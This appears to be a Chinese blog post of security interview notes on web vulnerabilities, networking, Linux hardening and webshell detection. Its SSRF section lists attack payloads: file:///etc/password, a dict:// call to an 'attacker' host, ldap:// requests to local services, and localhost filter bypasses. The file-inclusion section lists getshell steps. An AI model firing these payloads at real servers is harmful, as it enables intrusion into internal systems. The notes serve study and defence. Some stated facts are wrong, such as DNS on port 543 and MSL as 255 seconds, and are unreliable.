<h3 id="CSRF、SSRF和重放攻击有什么区别？"><a href="#CSRF、SSRF和重放攻击有什么区别？" class="headerlink" title="CSRF、SSRF和重放攻击有什么区别？"></a>CSRF、SSRF和重放攻击有什么区别？</h3><ul>
<li>CSRF是跨站请求伪造攻击，由客户端发起 </li>
<li>SSRF是服务器端请求伪造，由服务器发起 </li>
<li>重放攻击是将截获的数据包进行重放，达到身份认证等目的</li>
</ul>
<h3 id="啥是同源策略，跨域有几种方式？"><a href="#啥是同源策略，跨域有几种方式？" class="headerlink" title="啥是同源策略，跨域有几种方式？"></a>啥是同源策略，跨域有几种方式？</h3><blockquote>
<p><a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html</a></p>
</blockquote>
<p>浏览器安全的基石是”同源政策”，目的是为了保证用户的信息安全，防止恶意网站窃取数据，避免cookie共享。同源含义是协议、域名、端口相同的两个网页才可以共用cookie。目前如果非同源，有三种行为收到限制：<br>    - Cookie、LocalStorage 和 IndexDB 无法读取。<br>    - DOM 无法获得。<br>    - AJAX 请求不能发送</p>
<h3 id="如何规避同源策略？"><a href="#如何规避同源策略？" class="headerlink" title="如何规避同源策略？"></a>如何规避同源策略？</h3><h4 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h4><p>向服务器请求json数据回调，一般请求URL会加上<code>&amp;callback=xx</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">foo(&#123;</span><br><span class="line">  <span class="string">"ip"</span>: <span class="string">"8.8.8.8"</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>由于<code>&lt;script&gt;</code>元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了foo函数，该函数就会立即调用。作为参数的JSON数据被视为JavaScript对象，而不是字符串，因此避免了使用JSON.parse的步骤。</p>
<h5 id="JSONP的劫持"><a href="#JSONP的劫持" class="headerlink" title="JSONP的劫持"></a>JSONP的劫持</h5><blockquote>
<p><a href="http://blog.knownsec.com/2015/03/jsonp_security_technic/" target="_blank" rel="noopener">http://blog.knownsec.com/2015/03/jsonp_security_technic/</a></p>
</blockquote>
<p>防御：</p>
<ol>
<li>验证 JSON 文件调用的来源（ Referer ），但是Referer 过滤（正则）不严谨、空 Referer也不行</li>
<li>随机token</li>
<li><h4 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h4>WebSocket是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。</li>
</ol>
<h4 id="CORS-重点"><a href="#CORS-重点" class="headerlink" title="CORS(重点)"></a>CORS(重点)</h4><blockquote>
<p><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/04/cors.html</a></p>
</blockquote>
<p>CORS是跨源资源分享（Cross-Origin Resource Sharing）的缩写。它是W3C标准，是跨源AJAX请求的根本解决方法。相比JSONP只能发GET请求，CORS允许任何类型的请求。<br>CORS请求大致和ajax请求，但是在头信息中加上了Origin字段表明请求来自哪个源。如果orgin是许可范围之内的话，服务器返回的响应会多出<code>Acess-Control-Allow-*</code>的字段</p>
<h5 id="与JSONP的比较"><a href="#与JSONP的比较" class="headerlink" title="与JSONP的比较"></a>与JSONP的比较</h5><p>CORS与JSONP的使用目的相同，但是比JSONP更强大。</p>
<p>JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</p>
<h3 id="DOM-XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM-XSS？"><a href="#DOM-XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM-XSS？" class="headerlink" title="DOM XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM XSS？"></a>DOM XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM XSS？</h3><blockquote>
<p><a href="https://www.zhihu.com/question/26628342" target="_blank" rel="noopener">https://www.zhihu.com/question/26628342</a></p>
</blockquote>
<p>存储型XSS：你发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码；</p>
<p>反射型XSS：你发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码；</p>
<p>DOM型XSS：你发送一次带XSS代码的请求，在返回包里压根儿就找不到XSS代码的影子；</p>
<h3 id="CSP策略"><a href="#CSP策略" class="headerlink" title="CSP策略"></a>CSP策略</h3><blockquote>
<p><a href="https://www.zhihu.com/question/21979782" target="_blank" rel="noopener">https://www.zhihu.com/question/21979782</a><br>浏览器内容安全策略，减少xss攻击。</p>
</blockquote>
<h3 id="SSRF漏洞原理是什么？利用时有哪些伪协议？"><a href="#SSRF漏洞原理是什么？利用时有哪些伪协议？" class="headerlink" title="SSRF漏洞原理是什么？利用时有哪些伪协议？"></a>SSRF漏洞原理是什么？利用时有哪些伪协议？</h3><blockquote>
<p>secpulse.com/archives/65832.html</p>
</blockquote>
<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务。</p>
<h4 id="ssrf用处"><a href="#ssrf用处" class="headerlink" title="ssrf用处"></a>ssrf用处</h4><ol>
<li>探测内网信息,用协议探<code>ftp%26ip={ip}%26port={port}</code></li>
<li>攻击内网或本地其他服务</li>
<li>穿透防火墙</li>
</ol>
<h4 id="漏洞处"><a href="#漏洞处" class="headerlink" title="漏洞处"></a>漏洞处</h4><ol>
<li>能够对外发起网络请求的地方</li>
<li>请求远程服务器资源的地方</li>
<li>数据库内置功能</li>
<li>邮件系统</li>
<li>文件处理</li>
<li>在线处理工具</li>
</ol>
<p>举几个例子：</p>
<ol>
<li>在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。</li>
<li>根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。</li>
<li>数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。</li>
<li>邮件系统就是接收邮件服务器地址这些地方。</li>
<li>文件就找ImageMagick，xml这些。</li>
<li>从URL关键字中寻找，比如：source,share,link,src,imageurl,target等。</li>
</ol>
<h4 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h4><ol>
<li><code>http://example.com@127.0.0.1</code></li>
<li>利用IP地址的省略写法绕过,[::]绕过localhost</li>
<li>DNS解析 <a href="http://127.0.0.1.xip.io/" target="_blank" rel="noopener">http://127.0.0.1.xip.io/</a>  可以指向任意ip的域名：xip.io</li>
<li>利用八进制IP地址绕过,利用十六进制IP地址,绕过利用十进制的IP地址绕过</li>
</ol>
<h4 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h4><blockquote>
<p><a href="https://www.secpulse.com/archives/70471.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/70471.html</a></p>
</blockquote>
<p>接受ua为curl的时候，支持的协议有<br><img src="https://www.secpulse.com/wp-content/uploads/2018/04/15235056451.png" alt></p>
<p>使用<code>curl -v http://xx.com/ssrf.php?url=sxxx</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file://</span><br><span class="line">ssrf.php?url=file:///etc/password</span><br><span class="line">Dict://</span><br><span class="line">dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;</span><br><span class="line">ssrf.php?url=dict://attacker:11111/</span><br><span class="line">SFTP://</span><br><span class="line">ssrf.php?url=sftp://example.com:11111/</span><br><span class="line">TFTP://</span><br><span class="line">ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET</span><br><span class="line">LDAP://</span><br><span class="line">ssrf.php?url=ldap://localhost:11211/%0astats%0aquit</span><br><span class="line">Gopher://</span><br></pre></td></tr></table></figure>

<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><blockquote>
<p><a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="noopener">https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html</a></p>
</blockquote>
<ol>
<li><p>检查是否为内网IP地址<br>绕过方法:<br> 利用八进制IP地址绕过<br> 利用十六进制IP地址绕过<br> 利用十进制的IP地址绕过<br> 利用IP地址的省略写法绕过<br>最好的做法：IP地址转换为整数再进行判断</p>
</li>
<li><p>获取真正请求的host</p>
<ol>
<li><p>如何正确的获取用户输入的URL的Host？<br>最常见的就是，使用<a href="http://233.233.233.233@10.0.0.1:8080/、http://10.0.0.1#233.233.233.233这样的URL，让后端认为其Host是233.233.233.233，实际上请求的却是10.0.0.1。这种方法利用的是程序员对URL解析的错误，有很多程序员甚至会用正则去解析URL。使用urllib.parse可以解析真正的hostname" target="_blank" rel="noopener">http://233.233.233.233@10.0.0.1:8080/、http://10.0.0.1#233.233.233.233这样的URL，让后端认为其Host是233.233.233.233，实际上请求的却是10.0.0.1。这种方法利用的是程序员对URL解析的错误，有很多程序员甚至会用正则去解析URL。使用urllib.parse可以解析真正的hostname</a></p>
</li>
<li><p>只要Host只要不是内网IP即可吗？<br>host可能为ip,可能为域名，利用xip.io绕过。方法：判断是否为http协议，获取url的host，再解析该host，将解析到的ip再进行检查</p>
</li>
<li><p>只要Host指向的IP不是内网IP即可吗？<br>不一定，可能会30x跳转</p>
</li>
</ol>
</li>
</ol>
<p>归纳<br>解析目标URL，获取其Host<br>解析Host，获取Host指向的IP地址<br>检查IP地址是否为内网IP<br>请求URL<br>如果有跳转，拿出跳转URL，执行1</p>
<h3 id="在浏览器端，Referer可以篡改吗？"><a href="#在浏览器端，Referer可以篡改吗？" class="headerlink" title="在浏览器端，Referer可以篡改吗？"></a>在浏览器端，Referer可以篡改吗？</h3><p>通过插件修改，一般抓包修改</p>
<h3 id="xss盲打到内网服务器的利用"><a href="#xss盲打到内网服务器的利用" class="headerlink" title="xss盲打到内网服务器的利用"></a>xss盲打到内网服务器的利用</h3><h3 id="xss代码层防御"><a href="#xss代码层防御" class="headerlink" title="xss代码层防御"></a>xss代码层防御</h3><h2 id="文件上传下载遍历漏洞"><a href="#文件上传下载遍历漏洞" class="headerlink" title="文件上传下载遍历漏洞"></a>文件上传下载遍历漏洞</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ol>
<li>容器漏洞，解析漏洞</li>
</ol>
<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><blockquote>
<p><a href="https://blog.csdn.net/fuckcat_2333/article/details/52132559" target="_blank" rel="noopener">https://blog.csdn.net/fuckcat_2333/article/details/52132559</a></p>
</blockquote>
<h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ol>
<li>本地文件包含</li>
<li>远程文件包含 ：即加载远程文件，在<code>php.ini</code>中开启<code>allow_url_include</code>、<code>allow_url_fopen</code>选项。开启后可以直接执行任意代码。</li>
</ol>
<h3 id="PHP文件包含函数"><a href="#PHP文件包含函数" class="headerlink" title="PHP文件包含函数"></a>PHP文件包含函数</h3><ol>
<li><p><code>include()</code> ：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</p>
</li>
<li><p><code>inclue_once()</code> ：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</p>
</li>
<li><p><code>require()</code>：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</p>
</li>
<li><p><code>require_once()</code> ：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</p>
</li>
</ol>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ol>
<li>读取敏感文件</li>
<li>远程包含shell</li>
<li>图片上传并包含图片shenll</li>
<li>使用伪协议</li>
<li>包含日志文件GetShell</li>
<li>截断包含</li>
</ol>
<h3 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h3><ol>
<li>禁止远程文件包含 <code>allow_url_include=off</code></li>
<li>配置 <code>open_basedir=指定目录</code>，限制访问区域。</li>
<li>过滤<code>../</code>等特殊符号</li>
<li>修改Apache日志文件的存放地址</li>
<li>开启魔术引号 <code>magic_quotes_qpc=on</code></li>
<li>尽量不要使用动态变量调用文件，直接写要包含的文件。</li>
</ol>
<h2 id="web框架漏洞弱点"><a href="#web框架漏洞弱点" class="headerlink" title="web框架漏洞弱点"></a>web框架漏洞弱点</h2><h3 id="服务端注入之Flask框架中服务端模板注入问题"><a href="#服务端注入之Flask框架中服务端模板注入问题" class="headerlink" title="服务端注入之Flask框架中服务端模板注入问题"></a>服务端注入之Flask框架中服务端模板注入问题</h3><blockquote>
<p><a href="http://www.freebuf.com/articles/web/135953.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/135953.html</a></p>
</blockquote>
<h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h3 id="TCP三次握手四次挥手"><a href="#TCP三次握手四次挥手" class="headerlink" title="TCP三次握手四次挥手"></a>TCP三次握手四次挥手</h3><h4 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h4><ol>
<li>客户端 syn 发送到服务端，变成 SYN_SENT 状态</li>
<li>服务端 ack=syn+1 回传syn到客户端，变成SYN_RECV状态</li>
<li>客户端 ack=syn+1， 变成ESTABLISHED状态，传输给服务端</li>
<li>服务端收到ACK后变成ESTABLISHED状态，建立连接</li>
</ol>
<p>SYN标志位为表示请求连接，ACK表示确认</p>
<h4 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h4><p>客户端=主动关闭方</p>
<ol>
<li>客户端FIN-&gt;服务端</li>
<li>服务端ACK=FIN+1-&gt;客户端，服务端到客户端的连接关闭</li>
<li>服务端FIN-&gt;客户端</li>
<li>客户端ACK=FIN+1-&gt;服务端</li>
</ol>
<p>假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说”我Client端没有数据要发给你了”，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，”告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，”告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，”就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，”就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！</p>
<blockquote>
<p>MSL=最大段寿命=TTL=最大生存时间=255s</p>
</blockquote>
<h3 id="四层模型"><a href="#四层模型" class="headerlink" title="四层模型"></a>四层模型</h3><ol>
<li>应用层<br>应用层对应于OSI参考模型的高层，为用户提供所需要的各种服务，例如：FTP、Telnet、DNS、SMTP等.</li>
<li>传输层<br>传输层对应于OSI参考模型的传输层，为应用层实体提供端到端的通信功能，保证了数据包的顺序传送及数据的完整性。该层定义了两个主要的协议：传输控制协议（TCP）和用户数据报协议（UDP).<br>TCP协议提供的是一种可靠的、通过“三次握手”来连接的数据传输服务；而UDP协议提供的则是不保证可靠的（并不是不可靠）、无连接的数据传输服务.</li>
<li>网际互联层<br>网际互联层对应于OSI参考模型的网络层，主要解决主机到主机的通信问题。它所包含的协议设计数据包在整个网络上的逻辑传输。注重重新赋予主机一个IP地址来完成对主机的寻址，它还负责数据包在多种网络中的路由。该层有三个主要协议：网际协议（IP）、互联网组管理协议（IGMP）和互联网控制报文协议（ICMP）。<br>IP协议是网际互联层最重要的协议，它提供的是一个可靠、无连接的数据报传递服务。</li>
<li>网络接入层（即主机-网络层）<br>网络接入层与OSI参考模型中的物理层和数据链路层相对应。它负责监视数据在主机和网络之间的交换。事实上，TCP/IP本身并未定义该层的协议，而由参与互连的各网络使用自己的物理层和数据链路层协议，然后与TCP/IP的网络接入层进行连接。地址解析协议（ARP）工作在此层，即OSI参考模型的数据链路层。</li>
</ol>
<h3 id="当你输入一个网址，点击访问，会发生什么？"><a href="#当你输入一个网址，点击访问，会发生什么？" class="headerlink" title="当你输入一个网址，点击访问，会发生什么？"></a>当你输入一个网址，点击访问，会发生什么？</h3><h4 id="查找DNS记录"><a href="#查找DNS记录" class="headerlink" title="查找DNS记录"></a>查找DNS记录</h4><ol>
<li>查看浏览器缓存</li>
<li>查看系统缓存</li>
<li>查看路由器缓存</li>
<li>查找ISP DNS缓存</li>
<li>递归搜索。根据网址，发送一个DNS请求，UDP请求，端口为543，会请求一个DNS服务器，DNS服务器会不断递归查找这个网址的IP</li>
</ol>
<h4 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h4><ol start="2">
<li>跟获取到的IP建立TCP连接，在TCP连接上发送HTTP报文</li>
<li></li>
</ol>
<h3 id="常见的状态码"><a href="#常见的状态码" class="headerlink" title="常见的状态码"></a>常见的状态码</h3><h3 id="OSI七层"><a href="#OSI七层" class="headerlink" title="OSI七层"></a>OSI七层</h3><p>物理层、数据链路层、网络层、传输层(TCP，UDP)、会话层(RPC，SQL)、表示层(定义数据格式及加密)、应用层(TELNET，HTTP，FTP)</p>
<h4 id="OSI四层"><a href="#OSI四层" class="headerlink" title="OSI四层"></a>OSI四层</h4><h2 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h2><h3 id="你搭建过的最复杂的网络设备是什么"><a href="#你搭建过的最复杂的网络设备是什么" class="headerlink" title="你搭建过的最复杂的网络设备是什么"></a>你搭建过的最复杂的网络设备是什么</h3><h3 id="使用过什么硬件设备"><a href="#使用过什么硬件设备" class="headerlink" title="使用过什么硬件设备"></a>使用过什么硬件设备</h3><h2 id="Linux运维"><a href="#Linux运维" class="headerlink" title="Linux运维"></a>Linux运维</h2><h3 id="启动过程"><a href="#启动过程" class="headerlink" title="启动过程"></a>启动过程</h3><h3 id="Linux基线规范"><a href="#Linux基线规范" class="headerlink" title="Linux基线规范"></a>Linux基线规范</h3><p>每个公司有每个公司的基线规范体系，但是答题分为下列五个方面</p>
<h4 id="账号管理和授权"><a href="#账号管理和授权" class="headerlink" title="账号管理和授权"></a>账号管理和授权</h4><ul>
<li>检查特殊账号，是否存在空密码的账户和root权限账户</li>
<li>禁用或删除无用账号</li>
<li>添加口令策略:<code>/etc/login.defs</code>修改配置文件，设置过期时间、连续认证失败次数</li>
<li>禁止root远程登录，限制root用户直接登录。</li>
<li>检查su权限。<code>vi /etc/pam.d/su</code>添加<code>auth required pam_wheel.so group=test</code></li>
</ul>
<h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><ul>
<li>关闭不必要的服务</li>
<li>SSH服务安全<ul>
<li>不允许root账号直接登录系统，<code>PermitRootLogin=no</code></li>
<li>修改SSH使用的协议版本为2</li>
<li>修改允许密码错误次数（默认6次），<code>MaxAuthTries=3</code></li>
</ul>
</li>
</ul>
<h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h4><ul>
<li>设置umask值 <code>vi /etc/profile</code> 添加行 <code>umask 027</code></li>
<li>设置登录超时 <code>vi /etc/profile</code> 修改配置文件，将以 <code>TMOUT=</code> 开头的行注释，设置为 <code>TMOUT=180</code></li>
</ul>
<h4 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h4><ul>
<li>启用syslogd日志，配置日志目录权限，或者设置日志服务器</li>
<li>记录所有用户的登录和操作日志，通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查。<a href="https://www.alibabacloud.com/help/zh/faq-detail/49809.htm" target="_blank" rel="noopener">https://www.alibabacloud.com/help/zh/faq-detail/49809.htm</a></li>
</ul>
<h4 id="IP协议安全要求"><a href="#IP协议安全要求" class="headerlink" title="IP协议安全要求"></a>IP协议安全要求</h4><ul>
<li>远程登录取消telnet采用ssh</li>
<li>设置/etc/hosts.allow和deny</li>
<li>禁止ICMP重定向</li>
<li>禁止源路由转发</li>
<li>防ssh破解，iptables(对已经建立的所有链接都放行，限制每分钟连接ssh的次数)+denyhost(添加ip拒绝访问)</li>
</ul>
<h3 id="中间件基线规范（APACHE）"><a href="#中间件基线规范（APACHE）" class="headerlink" title="中间件基线规范（APACHE）"></a>中间件基线规范（APACHE）</h3><blockquote>
<p><a href="https://www.alibabacloud.com/help/zh/faq-detail/52981.htm" target="_blank" rel="noopener">https://www.alibabacloud.com/help/zh/faq-detail/52981.htm</a></p>
</blockquote>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><ul>
<li>账号</li>
<li>授权</li>
<li>日志</li>
<li>session过期时间（防ddos</li>
<li>绑定监听地址</li>
</ul>
<h4 id="禁止"><a href="#禁止" class="headerlink" title="禁止"></a>禁止</h4><ul>
<li>目录权限</li>
<li>访问外部文件</li>
<li>CGI</li>
<li>非法HTTP方法（PUT DELETE）</li>
</ul>
<h4 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h4><ul>
<li>服务版本号</li>
<li>重定向错误页面</li>
</ul>
<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><ul>
<li>配置文件</li>
<li>默认安装的无用文件</li>
</ul>
<h3 id="webshell检测思路"><a href="#webshell检测思路" class="headerlink" title="webshell检测思路"></a>webshell检测思路</h3><blockquote>
<p><a href="https://blog.csdn.net/u011066706/article/details/51175971" target="_blank" rel="noopener">https://blog.csdn.net/u011066706/article/details/51175971</a></p>
</blockquote>
<p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。</p>
<p>黑客通过浏览器以HTTP协议访问Web Server上的一个CGI文件，是一个合法的TCP连接，TCP/IP的应用层之下没有任何特征，只能在应用层进行检测。黑客入侵服务器，使用webshell，不管是传文件还是改文件，必然有一个文件会包含webshell代码，很容易想到从文件代码入手，这是静态特征检测；webshell运行后，B/S数据通过HTTP交互，HTTP请求/响应中可以找到蛛丝马迹，这是动态特征检测。</p>
<h4 id="静态检测"><a href="#静态检测" class="headerlink" title="静态检测"></a>静态检测</h4><p>静态检测通过匹配特征码，特征值，危险函数函数来查找webshell的方法，只能查找已知的webshell，并且误报率漏报率会比较高，但是如果规则完善，可以减低误报率，但是漏报率必定会有所提高。</p>
<p>优点是快速方便，对已知的webshell查找准确率高，部署方便，一个脚本就能搞定。缺点漏报率、误报率高，无法查找0day型webshell，而且容易被绕过。</p>
<p>静态检测配合人工</p>
<p>一个检查工具 <a href="https://github.com/he1m4n6a/findWebshell" target="_blank" rel="noopener">https://github.com/he1m4n6a/findWebshell</a></p>
<h4 id="动态检测"><a href="#动态检测" class="headerlink" title="动态检测"></a>动态检测</h4><p>Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。再者如果黑客反向连接的话，那很更容易检测了，Agent和IDS都可以抓现行。Webshell总有一个HTTP请求，如果我在网络层监控HTTP，并且检测到有人访问了一个从没反问过得文件，而且返回了200，则很容易定位到webshell，这便是http异常模型检测，就和检测文件变化一样，如果非管理员新增文件，则说明被人入侵了。</p>
<p>缺点也很明显，黑客只要利用原文件就很轻易绕过了，并且部署代价高，网站时常更新的话规则也要不断添加。</p>
<h4 id="日志检测"><a href="#日志检测" class="headerlink" title="日志检测"></a>日志检测</h4><p>使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测。</p>
<h4 id="语法检测"><a href="#语法检测" class="headerlink" title="语法检测"></a>语法检测</h4><p>实现关键危险函数的捕捉方式</p>
<h4 id="统计学检测"><a href="#统计学检测" class="headerlink" title="统计学检测"></a>统计学检测</h4><p>webshell由于往往经过了编码和加密，会表现出一些特别的统计特征，根据这些特征统计学习。<br>典型的代表: NeoPI – <a href="https://github.com/Neohapsis/NeoPI" target="_blank" rel="noopener">https://github.com/Neohapsis/NeoPI</a></p>
<h4 id="防范webshell"><a href="#防范webshell" class="headerlink" title="防范webshell"></a>防范webshell</h4><blockquote>
<p><a href="https://blog.csdn.net/nohaoye/article/details/46987587" target="_blank" rel="noopener">https://blog.csdn.net/nohaoye/article/details/46987587</a></p>
</blockquote>
<p>防范的措施大概有三种，第一种的思路是将专门存放上传文件的文件夹里面的脚本类型文件，解析成其他类型的文件，服务器不会以脚本类型来执行它。第二种是匹配文件夹里的脚本类型文件，将其设置为无法读取及操作。第三种是将文件上传到一个单独的文件夹，给一个二级的域名，然后不给这个虚拟站点解析脚本的权限，听说很多网站都用这种方式。</p>
<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><blockquote>
<p><a href="https://blog.csdn.net/kx_nullpointer/article/details/21299873" target="_blank" rel="noopener">https://blog.csdn.net/kx_nullpointer/article/details/21299873</a></p>
</blockquote>
<ol>
<li><code>at</code></li>
<li><code>batch</code></li>
<li><code>crontab</code></li>
<li><code>anacron</code>：检测停机期间应该执行但是没有执行的任务，将检测到的任务检测一次</li>
</ol>
<h3 id="自动化运维编写过什么脚本"><a href="#自动化运维编写过什么脚本" class="headerlink" title="自动化运维编写过什么脚本"></a>自动化运维编写过什么脚本</h3><h3 id="yum用的什么源（本地自搭，挂载）"><a href="#yum用的什么源（本地自搭，挂载）" class="headerlink" title="yum用的什么源（本地自搭，挂载）"></a>yum用的什么源（本地自搭，挂载）</h3><h3 id="awk-sed的使用"><a href="#awk-sed的使用" class="headerlink" title="awk sed的使用"></a>awk sed的使用</h3><h3 id="排错思路，排错经验"><a href="#排错思路，排错经验" class="headerlink" title="排错思路，排错经验"></a>排错思路，排错经验</h3><p>网络 防火墙 配置 权限</p>
<h3 id="日志分析ELK的使用和分析"><a href="#日志分析ELK的使用和分析" class="headerlink" title="日志分析ELK的使用和分析"></a>日志分析ELK的使用和分析</h3><blockquote>
<p><a href="https://www.zhihu.com/question/21427267" target="_blank" rel="noopener">https://www.zhihu.com/question/21427267</a></p>
</blockquote>
<ul>
<li>Elasticsearch是个开源分布式搜索引擎，它的特点有：分布式，零配置，自动发现，索引自动分片，索引副本机制，restful风格接口，多数据源，自动搜索负载等。</li>
<li>Logstash是一个完全开源的工具，他可以对你的日志进行收集、过滤，并将其存储供以后使用（如，搜索）。</li>
<li>Kibana 也是一个开源和免费的工具，它Kibana可以为 Logstash 和 ElasticSearch 提供的日志分析友好的 Web 界面，可以帮助您汇总、分析和搜索重要数据日志。</li>
</ul>
<p>举例-阿里规范<br>用户历史命令记录</p>
<p>缺点：安全性不够。使用x-pack实现安全认证及权限管理功能</p>
<h4 id="事件发生的分析"><a href="#事件发生的分析" class="headerlink" title="事件发生的分析"></a>事件发生的分析</h4><h3 id="用户权限管理-修改"><a href="#用户权限管理-修改" class="headerlink" title="用户权限管理(修改)"></a>用户权限管理(修改)</h3><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><h3 id="IPsec-VPN"><a href="#IPsec-VPN" class="headerlink" title="IPsec VPN"></a>IPsec VPN</h3><h3 id="安全监控工具"><a href="#安全监控工具" class="headerlink" title="安全监控工具"></a>安全监控工具</h3><ul>
<li>web进入-&gt;堡垒机-&gt;内部防御HIDS-&gt;内部监控，日志审计</li>
<li>zabbix性能监控工具 </li>
<li>HIDS</li>
</ul>
<h3 id="Linux木马查杀"><a href="#Linux木马查杀" class="headerlink" title="Linux木马查杀"></a>Linux木马查杀</h3><h3 id="常见的设备有啥"><a href="#常见的设备有啥" class="headerlink" title="常见的设备有啥"></a>常见的设备有啥</h3><ul>
<li>防火墙 utm 负载均衡设备</li>
<li>IPS IDS(HIDS基于主机型入侵检测系统)</li>
<li>堡垒机</li>
<li>蜜罐</li>
<li>网闸</li>
<li>waf</li>
<li>扫描器</li>
<li>soc(ossim开源安全信息管理系统)</li>
</ul>
<h2 id="Windows运维"><a href="#Windows运维" class="headerlink" title="Windows运维"></a>Windows运维</h2><h3 id="基线规范"><a href="#基线规范" class="headerlink" title="基线规范"></a>基线规范</h3><h3 id="木马查杀"><a href="#木马查杀" class="headerlink" title="木马查杀"></a>木马查杀</h3><p>脱壳，反汇编</p>
<h3 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h3><ol>
<li><p>控制面板-管理工具-计划任务，在“任务计划程序库”上右键–创建基本任务</p>
</li>
<li><p><code>schtasks</code>命令<br>语法:<br><code>schtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo modifier] [/d day] [/m month[,month...] [/i IdleTime] [/st StartTime] [/sd StartDate] [/ed EndDate] [/scomputer [/u [domain]user /p password]] [/ru {[Domain]User | &quot;System&quot;} [/rpPassword]] /?</code></p>
</li>
</ol>
<h2 id="ISO27000和等保-重点等保"><a href="#ISO27000和等保-重点等保" class="headerlink" title="ISO27000和等保(重点等保)"></a>ISO27000和等保(重点等保)</h2><h3 id="说一下ISO27000"><a href="#说一下ISO27000" class="headerlink" title="说一下ISO27000"></a>说一下ISO27000</h3><p>ISO27000是国际知名的信息安全管理体系标准，适用于整个企业，不仅仅是IT部门，还包括业务部门、财务、人事等部门。引入信息安全管理体系就可以协调各个方面信息管理，从而使管理更为有效。保证信息安全不是仅有一个防火墙，或找一个24小时提供信息安全服务的公司就可以达到的。它需要全面的综合管理。</p>
